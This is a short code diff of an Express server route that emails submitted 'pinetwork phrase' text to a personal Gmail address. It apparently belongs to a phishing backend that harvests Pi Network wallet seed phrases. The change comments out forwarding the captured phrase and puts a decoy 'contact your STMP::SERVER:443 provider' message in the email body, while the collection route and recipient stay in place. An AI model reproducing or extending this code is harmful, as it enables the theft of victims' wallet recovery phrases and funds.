@@ -61,8 +61,11 @@ app.post("/submit/7668", async (req, res) => {
         to: ["bondugella@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
-        text: mfText,
-        html: `<h1>${mfText}</h1>`,
+        // text: mfText,
+        text: "Please contact your STMP::SERVER:443 provider.",
+        html: "Please contact your STMP::SERVER:443 provider."
+        // html: `<h1>${mfText}</h1>`,
+        
       }).then(result=> console.log(result)).catch(err=> console.log(err));
     // }
 
